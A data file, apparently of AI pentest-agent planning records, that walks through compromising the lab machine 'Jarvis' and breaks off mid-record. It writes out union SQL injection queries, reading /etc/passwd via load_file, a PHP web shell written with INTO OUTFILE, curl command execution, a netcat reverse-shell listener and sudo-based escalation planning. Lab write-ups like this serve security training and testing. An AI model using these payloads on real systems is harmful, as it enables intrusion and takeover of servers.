jarvis,"1. Reconnaissance - [to-do]
   1.1 Passive Information Gathering - (completed)
   1.2 Active Information Gathering - (completed)
   1.3 Identify Open Ports, Services running on the open ports and their versions - (completed)
       1.3.1 Perform a port scan - {Host Status: Up (0.15s latency)} (completed)
       1.3.2 Determine the services and versions on each open port - {Port 22/tcp: State: Open, Service: SSH, Version: OpenSSH 7.4p1 Debian 10+deb9u6, Protocol: 2.0; Port 80/tcp: State: Open, Service: HTTP, Version: Apache httpd 2.4.25 (Debian), HTTP Cookie Flags: Path: /, PHPSESSID: httponly flag not set, Server Header: Apache/2.4.25 (Debian), Page Title: Stark Hotel; Port 64999/tcp: State: Open, Service: HTTP, Version: Apache httpd 2.4.25 (Debian), Server Header: Apache/2.4.25 (Debian), Page Title: Site doesn't have a title (text/html)} (completed)
   1.4 Target IP - 10.10.10.143 (completed)
   1.5 Webpage Analysis on Apache Server (Port 80) - ""Stark Hotel"" - (completed)
       1.5.1 Webpage Title - Stark Hotel (completed)
       1.5.2 Notable Feature - Login option available (completed)
       1.5.3 Virtual Host (vhost) - supersecurehotel.htb (requires addition to the hosts file for proper resolution) (completed)
       1.5.4 Webpage Security Note - {Observation: The webpage titled ""Stark Hotel"" is noted to be hardened; Outcome: Attempts to interact or scan the page resulted in the same outcomes as previously noted, indicating robust security measures are in effect} (completed)
       1.5.5 Webpage Navigation and Features - {Navigational Detail: Rooms Tab navigates to /room-suites.php; Room Options Displayed: Contains room details and their prices. Booking Link: [Book now!]; Booking Process: Action: Clicking on the ""Book now!"" button, Result: Opens a new URL with a query parameter named “cod”. http://10.10.10.143/room.php?cod=1} (completed)
   1.6 Gobuster Scanning Outcome - (completed)
       1.6.1 Action - Running Gobuster to scan the server (completed)
       1.6.2 Result - Received a ban message stating, ""Hey you have been banned for 90 seconds, don't be bad."" (completed)
       1.6.3 Implication - The server has active measures to prevent automated scanning tools, complicating further scanning activities (completed)
   1.7 SQL Injection Vulnerability Analysis - ""Stark Hotel"" Server (Port 80) - (completed)
       1.7.1 Vulnerable Parameter - {Parameter: `cod` in the URL `http://10.10.10.143/room.php?cod=`; Expectation: Server expects an integer value; Vulnerability: Susceptible to SQL injection; Database Insight: The table accessed by the query contains 7 rows} (completed)
       1.7.2 Injection Testing - {Method: Union based SQL injection; Test Query: `http://10.10.10.143/room.php?cod=-1 union select 1,2,3,4,5,6,7`; Resulting Output: Displays values 5, 2, 3, and 4; Inference: These values are injectable, indicating potential columns for data extraction} (completed)
       1.7.3 Additional Information from Output - {Displayed Content: Price: $3 per night; Booking Link: [Go to book!]} (completed)
   1.8 SQL Injection Exploitation Details - ""Stark Hotel"" Server (Port 80) - (completed)
       1.8.1 Injection Technique - {Test Query 1: `http://10.10.10.143/room.php?cod=-1 union select 1,database(),user(),4,5,6,7`; Output Interpretation: Database Version: 10.1.37-MariaDB-0+deb9u1, Current Database User: DBadmin@localhost; Displayed Content: Price symbol and [Go to book!] link} (completed)
       1.8.2 File Interaction Capabilities - {Test Query 2: `http://10.10.10.143/room.php?cod=-1 union select 1,load_file('/etc/passwd'),3,4,5,6,7`; Output: Lists system users (`root`, `daemon`, `bin`, etc.), indicating successful reading of sensitive system file `/etc/passwd`; Apache Configuration Inspection: Configuration Path: `/etc/apache2/sites-enabled/000-default.conf`, Relevant Configuration Details: DocumentRoot: /var/www/html, ServerName Directive: Used for redirection URLs and virtual host identification; Potential for File Writing: In MySQL, files can be written to the server using the `INTO OUTFILE` keyword, targeting the configured DocumentRoot} (completed)
       1.8.3 Security Implications - {Database Access: The ability to query the database version and current user suggests elevated privileges or weak security configurations; File Reading: Ability to read `/etc/passwd` demonstrates significant security risks, potentially allowing further exploitation such as privilege escalation; File Writing: The potential to write files using MySQL’s `INTO OUTFILE` could be exploited to execute arbitrary code or persist access if combined with other vulnerabilities} (completed)
       1.8.4 Recommendation - {Immediate Action: Audit and restrict SQL query handling on the server to prevent SQL injection; Further Investigation: Review server configuration for file permissions and secure database access controls to mitigate the risks of unauthorized file operations and data exposure} (completed)
   1.9 Web Server Exploitation Analysis - ""Stark Hotel"" Server (Port 80) - (completed)
       1.9.1 Exploitation Steps - {File Creation via SQL Injection: SQL Injection Query: `http://10.10.10.143/room.php?cod=-1 union select 1,'<?php system($_REQUEST[""exec""]);?>',3,4,5,6,7 into outfile '/var/www/html/pwned.php'; Outcome: Created a PHP file `pwned.php` on the server in the directory `/var/www/html`; File Content: PHP script capable of executing system commands passed through the `exec` request parameter} (completed)
       1.9.2 Remote Command Execution - {Command Execution Test: `curl -X POST http://10.10.10.143/pwned.php --data-urlencode exec=whoami`; Result: Successfully executed the command `whoami`, confirming the server's response as `www-data`, indicating the command was executed with web server user privileges} (completed)
       1.9.3 Establishing a Reverse Shell - {Listening on Attacker's Machine: `nc -lvp 1234`; Connection Established: Server at `10.10.10.143` connected to the attacker's listener on port `1234`; Shell Interaction: Errors Reported: Issues related to terminal control (e.g., ""inappropriate ioctl for device"" and ""no job control in this shell""); Command Execution: Executing `whoami` within the shell confirmed the identity as `www-data`} (completed)
       1.9.4 Security Implications - {The exploitation sequence demonstrates a high-risk vulnerability where an attacker can execute arbitrary commands on the server, potentially leading to full system compromise. The use of the web server's privileges (`www-data`) indicates that any command execution is confined within the permissions assigned to the web server's user account} (completed)
       1.9.5 Recommendations - {Immediate Remediation: Patch the SQL injection vulnerability on `room.php`. Remove the malicious `pwned.php` file and check for other potentially malicious files. Review and restrict file permissions, especially in web-accessible directories; Security Enhancements: Implement stringent input validation and parameterized queries to prevent SQL injection. Regularly audit web server and database configurations to ensure they adhere to security best practices. Consider deploying a Web Application Firewall (WAF) to detect and mitigate exploitation attempts; Incident Response: Conduct a thorough investigation to determine if further exploitation or data breaches have occurred. Enhance monitoring and logging to detect unusual activities indicative of a breach or attempted exploitation} (completed)",Try to create a reverese shell using the write permissions,"1. **Assessment of Current Strategic Position**: According to the updated PTT, the previous steps confirmed the server's susceptibility to SQL injection and demonstrated the ability to interact with the file system, specifically using the `INTO OUTFILE` SQL command. This indicates that the server permits writing files to a specified directory, which is a significant security vulnerability.

2. **Key Findings Leading to Further Steps**:
   - **Confirmed Write Permissions**: The ability to write files to the server's document root through SQL commands was established. This opens up the possibility of uploading arbitrary files, such as a web shell.
   - **Potential for Reverse Shell**: The presence of write permissions can be exploited to upload a web shell, which can then be used to execute system commands remotely. This could potentially escalate to gaining a reverse shell, providing interactive control over the server.

3. **Logical Progression to Selected Step**:
   - **Writing a Web Shell**: The next logical step is to exploit the write permissions to upload a web shell. This can be achieved by crafting a SQL query that uses the `INTO OUTFILE` command to write a PHP script into the server's web directory. The PHP script would be designed to execute system commands passed to it via HTTP requests.
   - **Gaining Reverse Shell Access**: Once the web shell is successfully uploaded and accessible via the web server, it can be used to initiate a reverse shell. This involves sending a command through the web shell that triggers a connection back to a listener (controlled by the tester) on another machine. This reverse shell would allow for full, interactive control over the server, mimicking the capabilities of an authenticated user.

4. **Ethical and Security Considerations**:
   - **Controlled Testing Environment**: It is crucial to ensure that these actions are conducted in a controlled environment where they are authorized. This step is aimed at demonstrating the potential impact of the vulnerability and helping system administrators understand the need for stringent security measures.
   - **Mitigation and Reporting**: Following the demonstration, it is necessary to report the findings and recommend measures to secure the file writing capabilities and address the SQL injection vulnerabilities, thus preventing potential exploitation by malicious actors.

By moving forward with the strategy to write a web shell and attempt to gain reverse shell access, we are directly building upon the established vulnerabilities to demonstrate a critical security risk. This approach not only tests the server's response to more advanced exploitation techniques but also helps in prioritizing security enhancements to mitigate these vulnerabilities.","**Web Server Exploitation Analysis - ""Stark Hotel"" Server (Port 80):**

- **Exploitation Steps:**
  1. **File Creation via SQL Injection:**
     - **SQL Injection Query:** 
       ```
       http://10.10.10.143/room.php?cod=-1 union select 1,'<?php system($_REQUEST[""exec""]);?>',3,4,5,6,7 into outfile '/var/www/html/pwned.php'
       ```
     - **Outcome:** Created a PHP file `pwned.php` on the server in the directory `/var/www/html`.
     - **File Content:** PHP script capable of executing system commands passed through the `exec` request parameter.

  2. **Remote Command Execution:**
     - **Command Execution Test:**
       ```
       curl -X POST http://10.10.10.143/pwned.php --data-urlencode exec=whoami
       ```
     - **Result:** Successfully executed the command `whoami`, confirming the server's response as `www-data`, indicating the command was executed with web server user privileges.
  
  3. **Establishing a Reverse Shell:**
     - **Listening on Attacker's Machine:**
       ```
       nc -lvp 1234
       ```
     - **Connection Established:** Server at `10.10.10.143` connected to the attacker's listener on port `1234`.
     - **Shell Interaction:**
       - **Errors Reported:** Issues related to terminal control (e.g., ""inappropriate ioctl for device"" and ""no job control in this shell"").
       - **Command Execution:** Executing `whoami` within the shell confirmed the identity as `www-data`.

**Security Implications:**
- The exploitation sequence demonstrates a high-risk vulnerability where an attacker can execute arbitrary commands on the server, potentially leading to full system compromise.
- The use of the web server's privileges (`www-data`) indicates that any command execution is confined within the permissions assigned to the web server's user account.

**Recommendations:**
1. **Immediate Remediation:**
   - Patch the SQL injection vulnerability on `room.php`.
   - Remove the malicious `pwned.php` file and check for other potentially malicious files.
   - Review and restrict file permissions, especially in web-accessible directories.

2. **Security Enhancements:**
   - Implement stringent input validation and parameterized queries to prevent SQL injection.
   - Regularly audit web server and database configurations to ensure they adhere to security best practices.
   - Consider deploying a Web Application Firewall (WAF) to detect and mitigate exploitation attempts.

3. **Incident Response:**
   - Conduct a thorough investigation to determine if further exploitation or data breaches have occurred.
   - Enhance monitoring and logging to detect unusual activities indicative of a breach or attempted exploitation.","Enumerate the files, commands and their privileges to escalate the privilege","1. **Evaluation of Previous Step Achievement**:
   - The previous steps in the penetration testing task list (PTT) successfully exploited SQL injection vulnerabilities to write a web shell (`pwned.php`) onto the server. This allowed for remote command execution which confirmed that commands were executed with the web server user privileges (`www-data`).
   - A reverse shell was also successfully established, providing interactive access to the server as the `www-data` user.

2. **Key Findings and Implications for Further Steps**:
   - **Access as `www-data`**: The current level of access is under the `www-data` user, which typically has limited privileges on the server. This user is used primarily for running the web server and has restricted access to critical system files and processes.
   - **Potential for Privilege Escalation**: Given the limited privileges of the `www-data` user, escalating privileges is essential for deeper system access. Privilege escalation can expose more sensitive areas of the system, potentially leading to administrative access.

3. **Strategy Evaluation and Next Steps**:
   - **Enumerate Files, Commands, and Privileges**: The next logical step is to enumerate the server for misconfigurations, vulnerable software versions, or writable configuration files that could be exploited to escalate privileges. This involves:
     - **Checking Sudo Rights**: Enumerate which commands can be run with sudo, particularly looking for misconfigurations that allow executing commands as a superuser without a password.
     - **Version and Patch Level Checking**: Identify the versions of the operating system and installed software to check against known vulnerabilities that might be exploited for privilege escalation.
     - **Writable Directories and Files**: Look for directories and files with improper permissions that might allow modifying scripts or binaries used by higher-privileged users.
   - **Continuation of Current Strategy**: Moving forward with privilege escalation is a direct continuation of the established access. It builds upon the current foothold to potentially gain full control over the system, which is the ultimate goal of penetration testing to identify and mitigate security risks.

Given the successful establishment of a reverse shell and the limited privileges associated with the `www-data` user, the strategy to enumerate files, commands, and their privileges to escalate privileges is both necessary and logical. This step will help in identifying further security weaknesses and enhancing the security posture of the system by addressing these escalation vectors.","Explore the suspicious files, commands and create a summary of the findings.","1. **Assessment of Current Strategic Position**:
   - The updated PTT indicates that we have successfully established a reverse shell with `www-data` user privileges on the target system. This level of access serves as a foundational step towards deeper system exploration and potential privilege escalation.
   - The aim now is to leverage the existing access to explore further vulnerabilities or misconfigurations that could allow for higher-level privileges.

2. **Key Findings Leading to Further Steps**:
   - **Limited Privileges of `www-data`**: The `www-data` user typically has restricted access, which limits the ability to view or alter critical system files directly. However, this user can often access various logs, temporary files, and some configuration files, which can be scrutinized for sensitive information or misconfigurations.
   - **Potential for Privilege Escalation**: Given the nature of the `www-data` user, the system may contain other vulnerabilities or misconfigurations in files or commands that the `www-data` user can access. These can potentially be exploited to escalate privileges.

3. **Logical Progression to Selected Step**:
   - **Exploring Suspicious Files and Commands**: The strategy involves methodically searching through the file system, particularly focusing on:
     - **Config Files and Scripts**: Many applications and system services store configurations in files that might have insecure permissions or contain credentials.
     - **Scheduled Tasks and Cron Jobs**: These might be configured to run scripts or commands as a higher-privileged user. Modifying these scripts or exploiting path vulnerabilities could lead to privilege escalation.
     - **Version and Patch Information**: Software with known vulnerabilities (which can be identified through version numbers) may allow exploitation if patches or updates have not been applied.
   - **Creating a Summary of Findings**: Documenting each potential vulnerability or misconfiguration found during the enumeration process. This summary will not only aid in understanding the current security posture but also guide the exploitation phase to escalate privileges effectively.

4. **Ethical and Security Considerations**:
   - **Controlled Exploration**: Ensure that the exploration is tightly scoped to avoid unnecessary system changes or disruptions. This step should be purely diagnostic and non-destructive.
   - **Documentation and Reporting**: Accurately documenting findings is crucial for remediation efforts. The summary should be detailed, pointing out specific misconfigurations, vulnerable software, or insecure permissions that could be addressed to enhance system security.

By moving forward with the strategy to explore suspicious files, commands, and their privileges, we are building upon the initial access to uncover deeper vulnerabilities. This approach is essential for a thorough security assessment, aiming to identify all possible vectors for privilege escalation and ultimately securing the system against such exploits.","{'Interactive CLI': 'Explore the file system for config files, scripts, and scheduled tasks.', 'Google search': 'Research known vulnerabilities related to software versions found.'}"
jarvis,"1. Reconnaissance - [to-do]
   1.1 Passive Information Gathering - (completed)
   1.2 Active Information Gathering - (completed)
   1.3 Identify Open Ports, Services running on the open ports and their versions - (completed)
       1.3.1 Perform a port scan - {Host Status: Up (0.15s latency)} (completed)
       1.3.2 Determine the services and versions on each open port - {Port 22/tcp: State: Open, Service: SSH, Version: OpenSSH 7.4p1 Debian 10+deb9u6, Protocol: 2.0; Port 80/tcp: State: Open, Service: HTTP, Version: Apache httpd 2.4.25 (Debian), HTTP Cookie Flags: Path: /, PHPSESSID: httponly flag not set, Server Header: Apache/2.4.25 (Debian), Page Title: Stark Hotel; Port 64999/tcp: State: Open, Service: HTTP, Version: Apache httpd 2.4.25 (Debian), Server Header: Apache/2.4.25 (Debian), Page Title: Site doesn't have a title (text/html)} (completed)
   1.4 Target IP - 10.10.10.143 (completed)
   1.5 Webpage Analysis on Apache Server (Port 80) - ""Stark Hotel"" - (completed)
       1.5.1 Webpage Title - Stark Hotel (completed)
       1.5.2 Notable Feature - Login option available (completed)
       1.5.3 Virtual Host (vhost) - supersecurehotel.htb (requires addition to the hosts file for proper resolution) (completed)
       1.5.4 Webpage Security Note - {Observation: The webpage titled ""Stark Hotel"" is noted to be hardened; Outcome: Attempts to interact or scan the page resulted in the same outcomes as previously noted, indicating robust security measures are in effect} (completed)
       1.5.5 Webpage Navigation and Features - {Navigational Detail: Rooms Tab navigates to /room-suites.php; Room Options Displayed: Contains room details and their prices. Booking Link: [Book now!]; Booking Process: Action: Clicking on the ""Book now!"" button, Result: Opens a new URL with a query parameter named “cod”. http://10.10.10.143/room.php?cod=1} (completed)
   1.6 Gobuster Scanning Outcome - (completed)
       1.6.1 Action - Running Gobuster to scan the server (completed)
       1.6.2 Result - Received a ban message stating, ""Hey you have been banned for 90 seconds, don't be bad."" (completed)
       1.6.3 Implication - The server has active measures to prevent automated scanning tools, complicating further scanning activities (completed)
   1.7 SQL Injection Vulnerability Analysis - ""Stark Hotel"" Server (Port 80) - (completed)
       1.7.1 Vulnerable Parameter - {Parameter: `cod` in the URL `http://10.10.10.143/room.php?cod=`; Expectation: Server expects an integer value; Vulnerability: Susceptible to SQL injection; Database Insight: The table accessed by the query contains 7 rows} (completed)
       1.7.2 Injection Testing - {Method: Union based SQL injection; Test Query: `http://10.10.10.143/room.php?cod=-1 union select 1,2,3,4,5,6,7`; Resulting Output: Displays values 5, 2, 3, and 4; Inference: These values are injectable, indicating potential columns for data extraction} (completed)
       1.7.3 Additional Information from Output - {Displayed Content: Price: $3 per night; Booking Link: [Go to book!]} (completed)
   1.8 SQL Injection Exploitation Details - ""Stark Hotel"" Server (Port 80) - (completed)
       1.8.1 Injection Technique - {Test Query 1: `http://10.10.10.143/room.php?cod=-1 union select 1,database(),user(),4,5,6,7`; Output Interpretation: Database Version: 10.1.37-MariaDB-0+deb9u1, Current Database User: DBadmin@localhost; Displayed Content: Price symbol and [Go to book!] link} (completed)
       1.8.2 File Interaction Capabilities - {Test Query 2: `http://10.10.10.143/room.php?cod=-1 union select 1,load_file('/etc/passwd'),3,4,5,6,7`; Output: Lists system users (`root`, `daemon`, `bin`, etc.), indicating successful reading of sensitive system file `/etc/passwd`; Apache Configuration Inspection: Configuration Path: `/etc/apache2/sites-enabled/000-default.conf`, Relevant Configuration Details: DocumentRoot: /var/www/html, ServerName Directive: Used for redirection URLs and virtual host identification; Potential for File Writing: In MySQL, files can be written to the server using the `INTO OUTFILE` keyword, targeting the configured DocumentRoot} (completed)
       1.8.3 Security Implications - {Database Access: The ability to query the database version and current user suggests elevated privileges or weak security configurations; File Reading: Ability to read `/etc/passwd` demonstrates significant security risks, potentially allowing further exploitation such as privilege escalation; File Writing: The potential to write files using MySQL’s `INTO OUTFILE` could be exploited to execute arbitrary code or persist access if combined with other vulnerabilities} (completed)
       1.8.4 Recommendation - {Immediate Action: Audit and restrict SQL query handling on the server to prevent SQL injection; Further Investigation: Review server configuration for file permissions and secure database access controls to mitigate the risks of unauthorized file operations and data exposure} (completed)
   1.9 Web Server Exploitation Analysis - ""Stark Hotel"" Server (Port 80) - (completed)
       1.9.1 Exploitation Steps - {File Creation via SQL Injection: SQL Injection Query: `http://10.10.10.143/room.php?cod=-1 union select 1,'<?php system($_REQUEST[""exec""]);?>',3,4,5,6,7 into outfile '/var/www/html/pwned.php'; Outcome: Created a PHP file `pwned.php` on the server in the directory `/var/www/html`; File Content: PHP script capable of executing system commands passed through the `exec` request parameter} (completed)
       1.9.2 Remote Command Execution - {Command Execution Test: `curl -X POST http://10.10.10.143/pwned.php --data-urlencode exec=whoami`; Result: Successfully executed the command `whoami`, confirming the server's response as `www-data`, indicating the command was executed with web server user privileges} (completed)
       1.9.3 Establishing a Reverse Shell - {Listening on Attacker's Machine: `nc -lvp 1234`; Connection Established: Server at `10.10.10.143` connected to the attacker's listener on port `1234`; Shell Interaction: Errors Reported: Issues related to terminal control (e.g., ""inappropriate ioctl for device"" and ""no job control in this shell""); Command Execution: Executing `whoami` within the shell confirmed the identity as `www-data`} (completed)
       1.9.4 Security Implications - {The exploitation sequence demonstrates a high-risk vulnerability where an attacker can execute arbitrary commands on the server, potentially leading to full system compromise. The use of the web server's privileges (`www-data`) indicates that any command execution is confined within the permissions assigned to the web server's user account} (completed)
       1.9.5 Recommendations - {Immediate Remediation: Patch the SQL injection vulnerability on `room.php`. Remove the malicious `pwned.php` file and check for other potentially malicious files. Review and restrict file permissions, especially in web-accessible directories; Security Enhancements: Implement stringent input validation and parameterized queries to prevent SQL injection. Regularly audit web server and database configurations to ensure they adhere to security best practices. Consider deploying a Web Application Firewall (WAF) to detect and mitigate exploitation attempts; Incident Response: Conduct a thorough investigation to determine if further exploitation or data breaches have occurred. Enhance monitoring and logging to detect unusual activities indicative of a breach or attempted exploitation} (completed)
   2.0 Privilege Escalation - [to-do]
       2.1 Sudo Privileges Analysis for User www-data on Server ""Jarvis"" - (completed)
           2.1.1 Context - {Investigation of `sudo` permissions for the user `www-data`} (completed)
           2.1.2 Environment Details - {Server: Jarvis; Location: `/var/www/html`} (completed)
           2.1.3 Sudo Permissions - {Command: `sudo -l`; Defaults Entries: `env_reset` ensures a minimal environment is passed to the command, `mail_badpass` sends an email if a bad password is entered, `secure_path` specifies a secure PATH setting (`/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin`)} (completed)
           2.1.4 Privileged Commands - {Permitted Command for www-data: Target User: pepper; Command: `/var/www/Admin-Utilities/simpler.py`; Permission: NOPASSWD (No password required for execution)} (completed)
           2.1.5 Security Implications - {The `www-data` user has passwordless `sudo` rights to execute `simpler.py` as the user `pepper`. This configuration can be potentially exploited if `simpler.py` is vulnerable to tampering or if `www-data` is compromised} (completed)
           2.1.6 Recommendations - {Review and Secure `simpler.py`: Ensure that `simpler.py` does not contain exploitable code or vulnerabilities that could be used to escalate privileges or execute arbitrary code. Implement strict access controls and regular audits on `simpler.py` to prevent unauthorized modifications. Limit Sudo Privileges: Reassess the necessity of granting `sudo` permissions to `www-data` for executing scripts as other users, especially without a password. Consider implementing command restrictions or requiring a password for sensitive operations to enhance security. Audit and Monitoring: Set up comprehensive logging and monitoring for actions performed using `sudo`, particularly for scripts executed with elevated privileges. Regularly review logs for unusual or unauthorized `sudo` activity. Incident Response Preparedness: Develop and test incident response plans that include scenarios of privilege escalation and unauthorized access through misuse of `sudo` privileges. This configuration should be carefully managed to prevent potential security breaches, considering the high level of access granted by these permissions} (completed)","Enumerate the files, commands and their privileges to escalate the privilege","1. **Assessment of Current Strategic Position**:
   - The updated PTT indicates that we have successfully established a reverse shell with `www-data` user privileges on the target system. This level of access serves as a foundational step towards deeper system exploration and potential privilege escalation.
   - The aim now is to leverage the existing access to explore further vulnerabilities or misconfigurations that could allow for higher-level privileges.

2. **Key Findings Leading to Further Steps**:
   - **Limited Privileges of `www-data`**: The `www-data` user typically has restricted access, which limits the ability to view or alter critical system files directly. However, this user can often access various logs, temporary files, and some configuration files, which can be scrutinized for sensitive information or misconfigurations.
   - **Potential for Privilege Escalation**: Given the nature of the `www-data` user, the system may contain other vulnerabilities or misconfigurations in files or commands that the `www-data` user can access. These can potentially be exploited to escalate privileges.

3. **Logical Progression to Selected Step**:
   - **Exploring Suspicious Files and Commands**: The strategy involves methodically searching through the file system, particularly focusing on:
     - **Config Files and Scripts**: Many applications and system services store configurations in files that might have insecure permissions or contain credentials.
     - **Scheduled Tasks and Cron Jobs**: These might be configured to run scripts or commands as a higher-privileged user. Modifying these scripts or exploiting path vulnerabilities could lead to privilege escalation.
     - **Version and Patch Information**: Software with known vulnerabilities (which can be identified through version numbers) may allow exploitation if patches or updates have not been applied.
   - **Creating a Summary of Findings**: Documenting each potential vulnerability or misconfiguration found during the enumeration process. This summary will not only aid in understanding the current security posture but also guide the exploitation phase to escalate privileges effectively.

4. **Ethical and Security Considerations**:
   - **Controlled Exploration**: Ensure that the exploration is tightly scoped to avoid unnecessary system changes or disruptions. This step should be purely diagnostic and non-destructive.
   - **Documentation and Reporting**: Accurately documenting findings is crucial for remediation efforts. The summary should be detailed, pointing out specific misconfigurations, vulnerable software, or insecure permissions that could be addressed to enhance system security.

By moving forward with the strategy to explore suspicious files, commands, and their privileges, we are building upon the initial access to uncover deeper vulnerabilities. This approach is essential for a thorough security assessment, aiming to identify all possible vectors for privilege escalation and ultimately securing the system against such exploits.","**Sudo Privileges Analysis for User www-data on Server ""Jarvis""**

- **Context:** Investigation of `sudo` permissions for the user `www-data`.
- **Environment Details:**
  - **Server:** Jarvis
  - **Location:** `/var/www/html`

- **Sudo Permissions:**
  - **Command:** `sudo -l`
  - **Defaults Entries:**
    - `env_reset`: Ensures a minimal environment is passed to the command.
    - `mail_badpass`: Sends an email if a bad password is entered.
    - `secure_path`: Specifies a secure PATH setting (`/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin`).
  
- **Privileged Commands:**
  - **Permitted Command for www-data:**
    - **Target User:** pepper
    - **Command:** `/var/www/Admin-Utilities/simpler.py`
    - **Permission:** NOPASSWD (No password required for execution).

**Security Implications:**
- The `www-data` user has passwordless `sudo` rights to execute `simpler.py` as the user `pepper`. This configuration can be potentially exploited if `simpler.py` is vulnerable to tampering or if `www-data` is compromised.

**Recommendations:**
1. **Review and Secure `simpler.py`:**
   - Ensure that `simpler.py` does not contain exploitable code or vulnerabilities that could be used to escalate privileges or execute arbitrary code.
   - Implement strict access controls and regular audits on `simpler.py` to prevent unauthorized modifications.

2. **Limit Sudo Privileges:**
   - Reassess the necessity of granting `sudo` permissions to `www-data` for executing scripts as other users, especially without a password.
   - Consider implementing command restrictions or requiring a password for sensitive operations to enhance security.

3. **Audit and Monitoring:**
   - Set up comprehensive logging and monitoring for actions performed using `sudo`, particularly for scripts executed with elevated privileges.
   - Regularly review logs for unusual or unauthorized `sudo` activity.

4. **Incident Response Preparedness:**
   - Develop and test incident response plans that include scenarios of privilege escalation and unauthorized access through misuse of `sudo` privileges.

This configuration should be carefully managed to prevent potential security breaches, considering the high level of access granted by these permissions.",Check the content of the file and find a way to manipulate it,"1. **Evaluation of Previous Step Achievement**:
   - The previous steps in the penetration testing task list (PTT) successfully identified that the `www-data` user has passwordless `sudo` privileges to execute the script `simpler.py` as the user `pepper`. This finding is crucial as it presents a potential vector for privilege escalation.
   - The analysis of `sudo` permissions was completed successfully, revealing that `simpler.py` can be executed without a password, which is a significant security concern if the script contains any vulnerabilities or is improperly secured.

2. **Key Findings and Implications for Further Steps**:
   - **Passwordless Sudo Permission**: The ability to execute `simpler.py` without a password underlines a critical security risk, especially if the script can be manipulated or if it executes other commands or scripts that might have higher privileges.
   - **Potential for Privilege Escalation**: The script `simpler.py` runs as another user (`pepper`), who might have higher privileges than `www-data`. If the script can be edited or if it includes other scripts or commands, modifying it could lead to executing commands as `pepper` or potentially even gaining root access.

3. **Strategy Evaluation and Next Steps**:
   - **Check the Content of `simpler.py`**: The next logical step is to inspect the contents of `simpler.py` to understand what the script does, which other scripts or commands it calls, and how it handles input and output. This will help to identify any insecure coding practices or vulnerabilities.
   - **Find a Way to Manipulate the Script**: Depending on the content of `simpler.py`, the strategy would involve looking for ways to inject or alter the script to execute arbitrary commands. This could involve appending commands, exploiting insecure file handling, or taking advantage of poor input validations within the script.
   - **Continue with the Current Strategy**: Given the high potential for gaining higher privileges through the manipulation of `simpler.py`, it is advisable to continue with the current strategy. This focused approach on a known vulnerability (passwordless sudo execution) provides a clear path towards achieving privilege escalation.

Given the successful identification of a critical security configuration allowing `www-data` to execute a script as another user without a password, the strategy to check the content of `simpler.py` and find a way to manipulate it is both necessary and logical. This step is crucial for understanding the extent of potential security risks and for implementing effective exploitation techniques to enhance the overall security assessment.","Explore the suspicious files, commands and create a summary of the findings.","1. **Assessment of Current Strategic Position**:
   - The updated PTT and previous analysis have established that the user `www-data` has passwordless sudo access to execute `simpler.py` as the user `pepper`. This presents a significant opportunity for privilege escalation if the script can be manipulated or exploited.
   - The focus now shifts to understanding the exact nature of `simpler.py`, its functionalities, and any potential vulnerabilities within the script that can be exploited.

2. **Key Findings Leading to Further Steps**:
   - **Passwordless Sudo Permission**: The critical finding that `simpler.py` can be executed without a password underlines a direct pathway to escalate privileges if vulnerabilities exist within the script.
   - **Potential for Code Manipulation**: If `simpler.py` is writable by `www-data`, or if it executes other scripts or commands that are insecure, there could be potential to modify its behavior to execute arbitrary commands with elevated privileges.

3. **Logical Progression to Selected Step**:
   - **Exploring `simpler.py`**: The strategy involves opening and reading through the `simpler.py` script to understand its code structure, what commands it executes, how it handles input, and whether it includes or references other files. This step is crucial to identify any insecure practices such as command injection points, unsanitized inputs, or unsafe file operations.
   - **Creating a Summary of Findings**: Document each observation about potential vulnerabilities, such as hard-coded paths, use of external commands, or other scripts that `simpler.py` might be calling. This summary will guide the exploitation phase, where specific vulnerabilities identified in `simpler.py` can be targeted to escalate privileges.
   - **Finding a Method to Exploit**: Based on the content analysis, determine how `simpler.py` can be exploited. This might involve injecting commands, exploiting path traversal vulnerabilities, or leveraging any misconfigurations. The goal is to modify the execution flow of `simpler.py` to run arbitrary commands as `pepper` or potentially escalate to root.

4. **Ethical and Security Considerations**:
   - **Controlled Exploration**: Ensure that the exploration of `simpler.py` is conducted in a controlled environment to prevent unintended system changes or disruptions. The focus should be on identifying vulnerabilities without exploiting them in a harmful manner.
   - **Documentation and Reporting**: Maintain detailed documentation of all findings and methods of potential exploitation. This documentation is vital for replicating the issues found and for the development of patches or security measures to mitigate these vulnerabilities.

By progressing with the strategy to explore the contents of `simpler.py` and finding ways to manipulate it, we are leveraging known vulnerabilities for a deeper security assessment. This approach is essential to potentially escalate privileges and enhance system security by addressing and mitigating discovered vulnerabilities.","{'Interactive CLI': 'Document observations about potential vulnerabilities in simpler.py, such as hard-coded paths and unsanitized inputs.'}"
jarvis,"1. Reconnaissance - [to-do]
   1.1 Passive Information Gathering - (completed)
   1.2 Active Information Gathering - (completed)
   1.3 Identify Open Ports, Services running on the open ports and their versions - (completed)
       1.3.1 Perform a port scan - {Host Status: Up (0.15s latency)} (completed)
       1.3.2 Determine the services and versions on each open port - {Port 22/tcp: State: Open, Service: SSH, Version: OpenSSH 7.4p1 Debian 10+deb9u6, Protocol: 2.0; Port 80/tcp: State: Open, Service: HTTP, Version: Apache httpd 2.4.25 (Debian), HTTP Cookie Flags: Path: /, PHPSESSID: httponly flag not set, Server Header: Apache/2.4.25 (Debian), Page Title: Stark Hotel; Port 64999/tcp: State: Open, Service: HTTP, Version: Apache httpd 2.4.25 (Debian), Server Header: Apache/2.4.25 (Debian), Page Title: Site doesn't have a title (text/html)} (completed)
   1.4 Target IP - 10.10.10.143 (completed)
   1.5 Webpage Analysis on Apache Server (Port 80) - ""Stark Hotel"" - (completed)
       1.5.1 Webpage Title - Stark Hotel (completed)
       1.5.2 Notable Feature - Login option available (completed)
       1.5.3 Virtual Host (vhost) - supersecurehotel.htb (requires addition to the hosts file for proper resolution) (completed)
       1.5.4 Webpage Security Note - {Observation: The webpage titled ""Stark Hotel"" is noted to be hardened; Outcome: Attempts to interact or scan the page resulted in the same outcomes as previously noted, indicating robust security measures are in effect} (completed)
       1.5.5 Webpage Navigation and Features - {Navigational Detail: Rooms Tab navigates to /room-suites.php; Room Options Displayed: Contains room details and their prices. Booking Link: [Book now!]; Booking Process: Action: Clicking on the ""Book now!"" button, Result: Opens a new URL with a query parameter named “cod”. http://10.10.10.143/room.php?cod=1} (completed)
   1.6 Gobuster Scanning Outcome - (completed)
       1.6.1 Action - Running Gobuster to scan the server (completed)
